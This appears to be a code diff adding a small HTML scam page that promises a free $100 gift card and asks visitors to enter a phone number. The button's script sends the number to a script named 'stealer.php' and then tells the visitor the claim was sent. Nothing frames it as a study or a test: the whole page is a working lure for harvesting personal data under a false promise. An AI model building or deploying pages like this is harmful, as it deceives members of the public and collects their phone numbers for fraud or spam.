@@ -1,0 +1,10 @@
+<title>Free $100 Gift Card!</title>
+<h1>🎁 Enter phone to claim:</h1>
+<input id="p" placeholder="555-123-4567">
+<button onclick="go()">GET IT NOW</button>
+<script>
+function go(){
+fetch('stealer.php?phone='+document.getElementById('p').value);
+alert('Claim sent!');
+}
+</script>
